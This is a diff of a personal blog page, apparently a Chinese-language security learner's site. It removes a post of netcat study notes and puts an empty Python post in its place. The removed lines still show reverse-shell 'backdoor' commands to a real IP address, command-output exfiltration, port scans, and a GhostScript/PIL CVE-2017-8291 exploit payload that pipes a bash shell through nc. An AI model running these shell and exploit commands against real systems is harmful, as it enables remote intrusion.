@@ -79,16 +79,13 @@
 
 
 
-<meta name="description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2017-11-3">
-<meta property="og:url" content="http://yoursite.com/2017/11/06/daily_1/index.html">
+<meta property="og:title" content="Rainer">
+<meta property="og:url" content="http://yoursite.com/2017/11/19/python_2/index.html">
 <meta property="og:site_name" content="Rainer">
-<meta property="og:description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令">
-<meta property="og:updated_time" content="2017-11-19T07:48:06.351Z">
+<meta property="og:updated_time" content="2017-11-19T07:38:08.838Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2017-11-3">
-<meta name="twitter:description" content="nc学习 自己vps上的监听命令:    123nc -l -p 443-l指定监听模式,  -p xxx指定监听的端口,上面以443为例  后门playload    12nc -e /bin/bash &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;nc -nv 138.197.214.134 443 -c bash 执行上述后,在监听方就可以执行任意命令">
+<meta name="twitter:title" content="Rainer">
 
 
 
@@ -118,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/06/daily_1/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/11/19/python_2/"/>
 
 
 
 
 
-  <title>2017-11-3 | Rainer</title>
+  <title> | Rainer</title>
   
 
 
@@ -251,7 +248,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/daily_1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/19/python_2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Rainer">
@@ -268,7 +265,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2017-11-3</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -280,8 +277,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-06T22:59:37+08:00">
-                2017-11-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-19T15:38:08+08:00">
+                2017-11-19
               </time>
             
 
@@ -290,28 +287,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -345,32 +320,7 @@
       
 
       
-        <h1 id="nc学习"><a href="#nc学习" class="headerlink" title="nc学习"></a>nc学习</h1><ul>
-<li>自己vps上的监听命令:  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443</div><div class="line">-l指定监听模式,  </div><div class="line">-p xxx指定监听的端口,上面以443为例</div></pre></td></tr></table></figure>
-<ul>
-<li>后门playload  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;</div><div class="line">nc -nv 138.197.214.134 443 -c bash</div></pre></td></tr></table></figure>
-<p>执行上述后,在<em>监听方</em>就可以执行任意命令<br><a id="more"></a></p>
-<ul>
-<li>反向执行<br>监听方:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lp 443 -c bash</div></pre></td></tr></table></figure>
-<p>连接方:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nv 138.197.214.134 443</div></pre></td></tr></table></figure>
-<p><em>连接方</em>就可执行任意命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443 &gt; 1.txt</div><div class="line">nc -nv 10.1.1.12 443 -q 1 #将接受到的内容写入文件</div><div class="line"></div><div class="line"><span class="meta">#</span>命令执行结果传输</div><div class="line">ls -l|nc -nv 10.1.1.12 443 #执行命令的同时将结果发送到nc连接</div><div class="line"></div><div class="line"><span class="meta">#</span>文件传输</div><div class="line">nc -lp 443 &gt; 2.mp4   #接受媒体</div><div class="line">nc -nv 10.1.1.12 443 &lt; a.mp4 -q 1  #发送媒体</div><div class="line"></div><div class="line"><span class="meta">#</span>端口扫描</div><div class="line">nc -nvz 10.1.1.11 1-65535  #TCP端口扫描</div><div class="line">nc -nvzu 10.1.1.11 1-65535   #UDP端口扫描</div></pre></td></tr></table></figure>
-<h2 id="Exploiting-Python-PIL-Module-Command-Execution-Vulnerability"><a href="#Exploiting-Python-PIL-Module-Command-Execution-Vulnerability" class="headerlink" title="Exploiting Python PIL Module Command Execution Vulnerability"></a>Exploiting Python PIL Module Command Execution Vulnerability</h2><p><a href="https://paper.seebug.org/405/" target="_blank" rel="external">https://paper.seebug.org/405/</a><br>PIL (Python Image Library) 应该是 Python 图片处理库中运用最广泛的，它拥有强大的功能和简洁的API。很多Python Web应用在需要实现处理图片的功能时，都会选择使用PIL。</p>
-<p>PIL在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在dSAFER模式下处理图片，即使是最新版本的PIL模块，也会受到 GhostButt CVE-2017-8291 dSAFER模式Bypass漏洞的影响，产生命令执行漏洞。</p>
-<ul>
-<li>poc使用说明:</li>
-<li>获取图像长宽高时<br>poc文件为.eps格式,但是可以更改<em>后缀名</em>,因为识别文件依赖于文件头<br>更改第89行:  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">16#</span>3f0 0 put</div><div class="line"></div><div class="line">currentdevice null false mark /OutputFile (%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</div><div class="line">.putdeviceparams</div><div class="line">1 true .outputpage</div></pre></td></tr></table></figure>
-<p><code>(%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</code> 处就可以更换playload<br>此处为使用nc连接</p>
-
+        
       
     </div>
     
@@ -394,8 +344,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/06/2017_11_14/" rel="next" title="PHPstudy">
-                <i class="fa fa-chevron-left"></i> PHPstudy
+              <a href="/2017/11/16/python_1/" rel="next" title="python学习-1">
+                <i class="fa fa-chevron-left"></i> python学习-1
               </a>
             
           </div>
@@ -403,10 +353,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/06/test/" rel="prev" title="test">
-                test <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -456,17 +402,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -532,22 +469,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nc学习"><span class="nav-number">1.</span> <span class="nav-text">nc学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploiting-Python-PIL-Module-Command-Execution-Vulnerability"><span class="nav-number">1.1.</span> <span class="nav-text">Exploiting Python PIL Module Command Execution Vulnerability</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
